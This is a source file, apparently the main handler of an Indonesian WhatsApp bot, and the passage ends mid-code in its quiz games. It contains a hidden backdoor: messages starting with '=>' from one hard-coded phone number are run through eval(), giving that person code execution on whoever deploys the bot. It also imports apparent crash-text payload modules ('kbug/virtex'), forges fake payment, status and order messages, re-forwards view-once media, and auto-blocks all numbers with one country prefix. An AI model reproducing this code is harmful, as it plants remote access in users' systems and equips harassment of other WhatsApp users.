require('./settings')
require('./lib/listmenu')
const { modul } = require('./module');
const { os, axios, baileys, chalk, cheerio, child_process, crypto, cookie, FormData, FileType, fetch, fs, fsx, ffmpeg, Jimp, jsobfus, PhoneNumber, process, moment, ms, speed, syntaxerror, util, ytdl } = modul;
const { exec, spawn, execSync } = child_process
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = baileys
const { clockString, formatp, tanggal, getTime, isUrl, sleep, runtime, fetchJson, getBuffer, jsonformat, format, reSize, generateProfilePicture } = require('./lib/myfunc')
const { color, bgcolor } = require('./lib/color')
const { buttonkal } = require('./kbug/virtex/buttonkal')
const { rentfromxeon, conns } = require('./RentBot')
const { uptotelegra } = require('./scrape/upload')
const { TelegraPh, UploadFileUgu, webp2mp4File, floNime } = require('./scrape/uploader')
const { dafontSearch, dafontDown } = require('./scrape/dafont')
const { ytDonlodMp3, ytDonlodMp4, ytPlayMp3, ytPlayMp4, ytSearch } = require('./scrape/yt')
const anon = require('./lib/menfess')
const scp1 = require('./scrape/scraper') 
const scp2 = require('./scrape/scraperr')
const scp3 = require('./scrape/scraperrr')
const ffstalk = require('./scrape/ffstalk')
const githubstalk = require('./scrape/githubstalk')
const npmstalk = require('./scrape/npmstalk')
const mlstalk = require('./scrape/mlstalk')
const textpro = require('./scrape/textpro')
const photooxy = require('./scrape/photooxy')
const { ios1 } = require('./kbug/virtex/ios1.js')
const { zetsubonotgay } = require('./kbug/virtex/zetsubonotgay.js')

const { ios2 } = require('./kbug/virtex/ios2.js')
const yts = require('./scrape/yt-search')
const kirleys = require('@adiwajshing/baileys')
const vm = require('node:vm')
const mark = `0@s.whatsapp.net`
const { EmojiAPI } = require("emoji-api");
const emoji = new EmojiAPI()
const owner = JSON.parse(fs.readFileSync('./database/owner.json'))
const prem = JSON.parse(fs.readFileSync('./database/premium.json'))
const xeonverifieduser = JSON.parse(fs.readFileSync('./database/user.json'))
const VoiceNoteXeon = JSON.parse(fs.readFileSync('./XeonMedia/database/xeonvn.json'))
const StickerXeon = JSON.parse(fs.readFileSync('./XeonMedia/database/xeonsticker.json'))
const ImageXeon = JSON.parse(fs.readFileSync('./XeonMedia/database/xeonimage.json'))
const VideoXeon = JSON.parse(fs.readFileSync('./XeonMedia/database/xeonvideo.json'))
const BadXeon = JSON.parse(fs.readFileSync('./database/bad.json'))
const contacts = JSON.parse(fs.readFileSync("./database/contacts.json"))

let autosticker = JSON.parse(fs.readFileSync('./database/autosticker.json'));
let ntnsfw = JSON.parse(fs.readFileSync('./database/nsfw.json'));
let ntvirtex = JSON.parse(fs.readFileSync('./database/antivirus.json'));
let nttoxic = JSON.parse(fs.readFileSync('./database/antitoxic.json'));
let ntwame = JSON.parse(fs.readFileSync('./database/antiwame.json'));
let ntlinkgc =JSON.parse(fs.readFileSync('./database/antilinkgc.json'));
let ntilinkall =JSON.parse(fs.readFileSync('./database/antilinkall.json'));
let ntilinktwt =JSON.parse(fs.readFileSync('./database/antilinktwitter.json'));
let ntilinktt =JSON.parse(fs.readFileSync('./database/antilinktiktok.json'));
let ntilinktg =JSON.parse(fs.readFileSync('./database/antilinktelegram.json'));
let ntilinkfb =JSON.parse(fs.readFileSync('./database/antilinkfacebook.json'));
let ntilinkig =JSON.parse(fs.readFileSync('./database/antilinkinstagram.json'));
let ntilinkytch =JSON.parse(fs.readFileSync('./database/antilinkytchannel.json'));
let ntilinkytvid =JSON.parse(fs.readFileSync('./database/antilinkytvideo.json'));

let tebaklagu = []
let kuismath = []
let tebakgambar = []
let tebakkata = []
let tebakkalimat = []
let tebaklirik = []
let tebaktebakan = []
let tebakbendera = []
let tebakbendera2 = []
let tebakkabupaten = []
let tebakkimia = []
let tebakasahotak = []
let tebaksiapakahaku = []
let tebaksusunkata = []
let tebaktekateki = []

global.db = JSON.parse(fs.readFileSync('./database/database.json'))
if (global.db) global.db = {
sticker: {},
database: {}, 
game: {},
others: {},
users: {},
chats: {},
...(global.db || {})
}

module.exports = Kyuu = async (Kyuu, m, chatUpdate, store) => {
try {
        const { type, quotedMsg, mentioned, now, fromMe } = m
        const gakbisaowner = `${ownernumber}@s.whatsapp.net`
        const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
        const budy = (typeof m.text == 'string' ? m.text : '')
        const prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
        const chath = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == "listResponseMessage") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == "messageContextInfo") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : ''
        const pes = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text: ''
        const messagesC = pes.slice(0).trim()
        const content = JSON.stringify(m.message)
        const isCmd = body.startsWith(prefix)
        const from = m.key.remoteJid
        const messagesD = body.slice(0).trim().split(/ +/).shift().toLowerCase()
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const pushname = m.pushName || "No Name"
        const botNumber = await Kyuu.decodeJid(Kyuu.user.id)
        const isOwner = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const XeonTheDeveloper = m.sender == botNumber ? true : false
        const text = q = args.join(" ")
        const quoted = m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const qmsg = (quoted.msg || quoted)
        const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
		const isVideo = (type == 'videoMessage')
		const isAudio = (type == 'audioMessage')
		const isSticker = (type == 'stickerMessage')
		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
        const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
        const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
        const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
        const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
        const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
        const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
        const senderNumber = sender.split('@')[0]
        const groupMetadata = m.isGroup ? await Kyuu.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const groupMembers = m.isGroup ? groupMetadata.participants : ''
    	const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
        const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
    	const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
    	const isPrem = prem.includes(m.sender)
    	const isContacts = contacts.includes(m.sender)
    	const isUser = xeonverifieduser.includes(sender)
    	const banUser = await Kyuu.fetchBlocklist()
        const isBanned = banUser ? banUser.includes(m.sender) : false
    	const mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
    	const mentionByTag = type == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
        const mentionByReply = type == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.participant || '' : ''
        const numberQuery = q.replace(new RegExp('[()+-/ +/]', 'gi'), '') + '@s.whatsapp.net'
        const usernya = mentionByReply ? mentionByReply : mentionByTag[0]
        const Input = mentionByTag[0] ? mentionByTag[0] : mentionByReply ? mentionByReply : q ? numberQuery : false
    	const isEval = body.startsWith('=>');
    
        const AntiNsfw = m.isGroup ? ntnsfw.includes(from) : false
        const isAutoSticker = m.isGroup ? autosticker.includes(from) : false
        const antiVirtex = m.isGroup ? ntvirtex.includes(from) : false
        const Antilinkgc = m.isGroup ? ntlinkgc.includes(m.chat) : false
        const AntiLinkYoutubeVid = m.isGroup ? ntilinkytvid.includes(from) : false
        const AntiLinkYoutubeChannel = m.isGroup ? ntilinkytch.includes(from) : false
        const AntiLinkInstagram = m.isGroup ? ntilinkig.includes(from) : false
        const AntiLinkFacebook = m.isGroup ? ntilinkfb.includes(from) : false
        const AntiLinkTiktok = m.isGroup ? ntilinktt.includes(from) : false
        const AntiLinkTelegram = m.isGroup ? ntilinktg.includes(from) : false
        const AntiLinkTwitter = m.isGroup ? ntilinktwt.includes(from) : false
        const AntiLinkAll = m.isGroup ? ntilinkall.includes(from) : false
        const antiWame = m.isGroup ? ntwame.includes(from) : false
        const antiToxic = m.isGroup ? nttoxic.includes(from) : false
    
        
        const kyuuThumb = fs.readFileSync('./thumbnail/thumbnail.jpg')
        
        //TIME
        const xtime = moment.tz('Asia/Kolkata').format('HH:mm:ss')
        const xdate = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
        const time2 = moment().tz('Asia/Kolkata').format('HH:mm:ss')  
         if(time2 < "23:59:00"){
var xeonytimewisher = `Good Night 🌌`
 }
 if(time2 < "19:00:00"){
var xeonytimewisher = `Good Evening 🌃`
 }
 if(time2 < "18:00:00"){
var xeonytimewisher = `Good Evening 🌃`
 }
 if(time2 < "15:00:00"){
var xeonytimewisher = `Good Afternoon 🌅`
 }
 if(time2 < "11:00:00"){
var xeonytimewisher = `Good Morning 🌄`
 }
 if(time2 < "05:00:00"){
var xeonytimewisher = `Good Morning 🌄`
 } 

		if (isEval && senderNumber == "6285813708397") {
			let evaled,
				text = q,
				{ inspect } = require('util');
			try {
				if (text.endsWith('--sync')) {
					evaled = await eval(
						`(async () => { ${text.trim.replace('--sync', '')} })`
					);
					m.reply(evaled);
				}
				evaled = await eval(text);
				if (typeof evaled !== 'string') evaled = inspect(evaled);
				await Kyuu.sendMessage(from, { text: evaled }, { quoted: m });
			} catch (e) {
				Kyuu.sendMessage(from, { text: String(e) }, { quoted: m });
			}
		}
try {
const isNumber = x => typeof x === 'number' && !isNaN(x)
const user = global.db.users[m.sender]
if (typeof user !== 'object') global.db.users[m.sender] = {}
const chats = global.db.chats[m.chat]
if (typeof chats !== 'object') global.db.chats[m.chat] = {}
if (user) {
if (!isNumber(user.afkTime)) user.afkTime = -1
if (!('afkReason' in user)) user.afkReason = ''
if (!("premium" in user)) user.premium = false
} else global.db.users[m.sender] = {
afkTime: -1,
afkReason: '',
premium: false
}
} catch (err) {
console.error(err)
}

if (!Kyuu.public) {
if (!m.key.fromMe) return
}

    const { getRegisteredRandomId, addRegisteredUser, createSerial, checkRegisteredUser } = require('./database/register.js')
//chat counter (console log)
 /*       if (m.message && m.isGroup) {
            Kyuu.readMessages([m.key])
            console.log(color(`\n< ================================================== >\n`, 'cyan'))
			console.log(color(`Group Chat:`, 'green'))
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> In'), chalk.green(groupName, m.chat))
        } else {
            Kyuu.readMessages([m.key])
            console.log(color(`\n< ================================================== >\n`, 'cyan'))
			console.log(color(`Private Chat:`, 'green'))
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender))
        }*/

if (isCmd && !isUser) {
xeonverifieduser.push(sender)
fs.writeFileSync('./database/user.json', JSON.stringify(xeonverifieduser, null, 2))
}

Kyuu.sendPresenceUpdate('available', from)

for (let jid of mentionUser) {
let user = global.db.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
m.reply(`Don't Tag Him!
He's AFK ${reason ? 'With Reason: ' + reason : 'No Reason'}
During ${clockString(new Date - afkTime)}
`.trim())
}

if (db.users[m.sender].afkTime > -1) {
let user = global.db.users[m.sender]
m.reply(`
You Quit AFK${user.afkReason ? ' After: ' + user.afkReason : ''}
During ${clockString(new Date - user.afkTime)}
`.trim())
user.afkTime = -1
user.afkReason = ''
}

//auto block pakistan number
if (m.sender.startsWith('212')) return Kyuu.updateBlockStatus(m.sender, 'block')

async function sendKyuuMessage(chatId, message, options = {}){
    let generate = await generateWAMessage(chatId, message, options)
    let type2 = getContentType(generate.message)
    if ('contextInfo' in options) generate.message[type2].contextInfo = options?.contextInfo
    if ('contextInfo' in message) generate.message[type2].contextInfo = message?.contextInfo
    return await Kyuu.relayMessage(chatId, generate.message, { messageId: generate.key.id })
}
//group chat msg  by Fxyz
const replygcxeon = (teks) => {
Kyuu.sendMessage(m.chat,
{ text: teks,
contextInfo:{
mentionedJid:[sender],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": kyuuThumb,
"sourceUrl": `${wagc}`}}},
{ quoted: m})
}
const replygcxeon2 = (teks) => {        
sendKyuuMessage(from, { 
text: teks,
mentions:[sender],
contextInfo:{
forwardingScore: 9999999,
isForwarded: true, 
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": defaultpp,
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
const reply = (teks) => {
Kyuu.sendMessage(from, { text: teks ,
contextInfo:{
forwardingScore: 9999999, 
isForwarded: true
}
}, { quoted : m })
}

const sendSticker = (pesan) => {
Kyuu.sendImageAsSticker(m.chat, pesan, m, { packname: global.packname, author: global.author })
}

try {
ppuser = await Kyuu.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
defaultpp = await reSize(ppuser, 300, 300)

const sendvn = (teks) => {
Kyuu.sendMessage(from, { audio: teks, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
}

//

        const more = String.fromCharCode(8206)
        const readmore = more.repeat(4001)
        
//autoreply
        	const isRegistered = checkRegisteredUser(m.sender)
        //
for (let BhosdikaXeon of VoiceNoteXeon) {
if (budy === BhosdikaXeon) {
let audiobuffy = fs.readFileSync(`./XeonMedia/audio/${BhosdikaXeon}.mp3`)
Kyuu.sendMessage(m.chat, { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
}
}
for (let BhosdikaXeon of StickerXeon){
if (budy === BhosdikaXeon){
let stickerbuffy = fs.readFileSync(`./XeonMedia/sticker/${BhosdikaXeon}.webp`)
Kyuu.sendMessage(m.chat, { sticker: stickerbuffy }, { quoted: m })
}
}
for (let BhosdikaXeon of ImageXeon){
if (budy === BhosdikaXeon){
let imagebuffy = fs.readFileSync(`./XeonMedia/image/${BhosdikaXeon}.jpg`)
Kyuu.sendMessage(m.chat, { image: imagebuffy }, { quoted: m })
}
}
for (let BhosdikaXeon of VideoXeon){
if (budy === BhosdikaXeon){
let videobuffy = fs.readFileSync(`./XeonMedia/video/${BhosdikaXeon}.mp4`)
Kyuu.sendMessage(m.chat, { video: videobuffy }, { quoted: m })
}
}

if (m.isGroup && m.mtype == 'viewOnceMessage') {
let teks = `╭「 *Anti ViewOnce* 」\n├ *Name* : ${pushname}\n├ *User* : @${m.sender.split("@")[0]}\n├ *Clock* : ${time2}\n└ *Message* : ${m.mtype}`
Kyuu.sendMessage(m.chat, { text: teks, mentions: [m.sender] }, { quoted: m })
await sleep(500)
m.copyNForward(m.chat, true, {readViewOnce: true}, {quoted: m}).catch(_ => m.reply(`Maybe It's Opened`))
}

const lep = {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption":  `${ownername}`, 
"jpegThumbnail": defaultpp
}
}
}

const ftext = { 
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...(from ? {
remoteJid: `${ownernumber}@s.whatsapp.net` } : {}) }, 
message: { 
extendedTextMessage: { 
text: `${m.pushName}`, 
title: `${m.pushName}`, 
jpegThumbnail: defaultpp } } }

const banRep = () => {
Kyuu.sendMessage(m.chat, {
text:`Sorry you've been banned, please chat @${creator.split("@")[0]} to unban`,
mentions: [creator],
},
{
quoted:m
})
}
//
async function obfus(query) {
return new Promise((resolve, reject) => {
try {
const obfuscationResult = jsobfus.obfuscate(query,
{
compact: false,
controlFlowFlattening: true,
controlFlowFlatteningThreshold: 1,
numbersToExpressions: true,
simplify: true, 
stringArrayShuffle: true,
splitStrings: true,
stringArrayThreshold: 1
}
);
const result = {
status: 200,
author: `𝗖𝗲𝗸𝗶𝗹-𝗠𝗱`,
result: obfuscationResult.getObfuscatedCode()
}
resolve(result)
} catch (e) {
reject(e)
}
})
}

//Fake
	    const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "status@broadcast"}, "message": {orderMessage: {itemCount: 2022,status: 200, thumbnail: thumb, surface: 200, message: botname, orderTitle: ownername, sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
		const fdoc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: botname,jpegThumbnail: thumb}}}
		const fvn = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":359996400,"ptt": "true"}} } 
		const fgif = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: {"videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'gifPlayback': 'true', 'caption': ownername, 'jpegThumbnail': thumb}}}
		const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": wm, "caption": `${pushname}`, 'jpegThumbnail': thumb}}}
		const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {}) },message: { "videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'caption': `${pushname}`, 'jpegThumbnail': thumb}}}
		const floc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: wm,jpegThumbnail: thumb}}}
		const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `status@broadcast` } : {}) }, message: { 'contactMessage': { 'displayName': ownername, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${ownername},;;;\nFN:${ownername}\nitem1.TEL;waid=916909137213:916909137213\nitem1.X-ABLabel:Mobile\nEND:VCARD`, 'jpegThumbnail': thumb, thumbnail: thumb,sendEphemeral: true}}}
	    const fakestatus = {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "imageMessage": {"url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc","mimetype": "image/jpeg","caption": wm,"fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=","fileLength": "28777","height": 1080,"width": 1079,"mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=","fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=","directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69","mediaKeyTimestamp": "1610993486","jpegThumbnail": fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),"scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="}}}
    const zets = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? {remoteJid :"status@broadcast" }: {})},
 message:{"orderMessage":{"orderId":"174238614569438",
 "thumbnail":kyuuThumb, //image 0kb
 "itemCount":999999999,
 "status":"INQUIRY","surface":"CATALOG","message":`Kyuu444`,
 "token":"AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA==" }},
 contextInfo: {"mentionedJid":m.sender.split, "forwardingScore":999,"isForwarded":true}}
    
    
if (isCmd && isBanned) {
return banRep()
}

let list = []
for (let i of owner) {
list.push({
	    	displayName: await Kyuu.getName(i),
	    	vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await Kyuu.getName(i)}\nFN:${await Kyuu.getName(i)}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${ytname}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
	    })
	}

const repPy = {
	key: {
		remoteJid: '0@s.whatsapp.net',
		fromMe: false,
		id: `${ownername}`,
		participant: '0@s.whatsapp.net'
	},
	message: {
		requestPaymentMessage: {
			currencyCodeIso4217: "USD",
			amount1000: 999999999,
			requestFrom: '0@s.whatsapp.net',
			noteMessage: {
				extendedTextMessage: {
					text: `${botname}`
				}
			},
			expiryTimestamp: 999999999,
			amount: {
				value: 91929291929,
				offset: 1000,
				currencyCode: "INR"
			}
		}
	}
}
//GAME
        if (tebakgambar.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakgambar[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
                await reply('*Anda Telah menyerah*')
                delete tebakgambar[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
                await Kyuu.sendText(m.chat, `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉`, m)
                delete tebakgambar[m.sender.split('@')[0]]
            } else reply('*Jawaban Salah!*')
        }
        if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = kuismath[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
                await reply('*Anda Telah menyerah*')
                delete kuismath[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
                await reply(`🎮 Kuis Matematika  🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? kirim ${prefix}math mode`)
                delete kuismath[m.sender.split('@')[0]]
            } else reply('*Jawaban Salah!*')
        }
        if (tebakasahotak.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakasahotak[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
                await reply('*Anda Telah menyerah*')
                delete tebakasahotak[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
                await Kyuu.sendText(m.chat, `🎮 Asah Otak 🎮\n\nJawaban Benar 🎉`, m)
                delete tebakasahotak[m.sender.split('@')[0]]
            } else reply('*Jawaban Salah!*')
        }
        if (tebaksiapakahaku.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaksiapakahaku[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
                await reply('*Anda Telah menyerah*')
                delete tebaksiapakahaku[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
                await Kyuu.sendText(m.chat, `🎮 Siapakah Aku 🎮\n\nJawaban Benar 🎉`, m)
                delete tebaksiapakahaku[m.sender.split('@')[0]]
            } else reply('*Jawaban Salah!*')
        }
        if (tebaksusunkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaksusunkata[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
                await reply('*Anda Telah menyerah*')
                delete tebaksusunkata[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
                await Kyuu.sendText(m.chat, `🎮 Susun Kata 🎮\n\nJawaban Benar 🎉`, m)
                delete tebaksusunkata[m.sender.split('@')[0]]
            } else reply('*Jawaban Salah!*')
        }
        if (tebakbendera.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakbendera[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
                await reply('*Anda Telah menyerah*')
                delete tebakbendera[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
                await Kyuu.sendText(m.chat, `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉`, m)
                delete tebakbendera[m.sender.split('@')[0]]
            } else reply('*Jawaban Salah!*')
        }
        if (tebakbendera2.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakbendera2[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
                await reply('*Anda Telah menyerah*')
                delete tebakbendera2[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
                await Kyuu.sendText(m.chat, `🎮 Tebak Bendera 🎮\n\nJawaban Benar 🎉`, m)
                delete tebakbendera2[m.sender.split('@')[0]]
            } else reply('*Jawaban Salah!*')
        }
        if (tebakkabupaten.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkabupaten[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
                await reply('*Anda Telah menyerah*')
                delete tebakkabupaten[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
                await Kyuu.sendText(m.chat, `🎮 Tebak Kabupaten 🎮\n\nJawaban Benar 🎉`, m)
                delete tebakkabupaten[m.sender.split('@')[0]]
            } else reply('*Jawaban Salah!*')
        }
        if (tebakkimia.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkimia[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
                await reply('*Anda Telah menyerah*')
                delete tebakkimia[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
                await Kyuu.sendText(m.chat, `🎮 Tebak Kimia 🎮\n\nJawaban Benar 🎉`, m)
                delete tebakkimia[m.sender.split('@')[0]]
            } else reply('*Jawaban Salah!*')
        }
        if (tebaktekateki.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaktekateki[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
                await reply('*Anda Telah menyerah*')
                delete tebaktekateki[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
                await Kyuu.sendText(m.chat, `🎮 Teka Teki 🎮\n\nJawaban Benar 🎉`, m)
                delete tebaktekateki[m.sender.split('@')[0]]
            } else reply('*Jawaban Salah!*')
        }
        if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaklagu[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
                await reply('*Anda Telah menyerah*')
                delete tebaklagu[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
                await Kyuu.sendText(m.chat, `🎮 Tebak Lagu 🎮\n\nJawaban Benar 🎉`, m)
                delete tebaklagu[m.sender.split('@')[0]]
            } else reply('*Jawaban Salah!*')
        }
        if (tebakkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkata[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
